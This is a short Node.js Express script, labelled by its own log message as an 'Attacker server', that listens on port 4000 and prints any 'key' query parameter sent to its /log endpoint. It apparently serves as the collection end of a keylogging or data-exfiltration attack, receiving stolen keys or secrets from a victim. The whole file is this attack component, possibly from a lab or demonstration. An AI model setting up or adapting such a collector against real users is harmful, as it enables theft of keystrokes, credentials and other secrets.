const express = require('express');
const app = express();
const port = 4000;

app.get('/log', (req, res) => {
  const { key } = req.query;
  console.log("Captured key:", key);
  res.send("ok");
});

app.listen(port, () => {
  console.log(`Attacker server running at http://localhost:${port}`);
});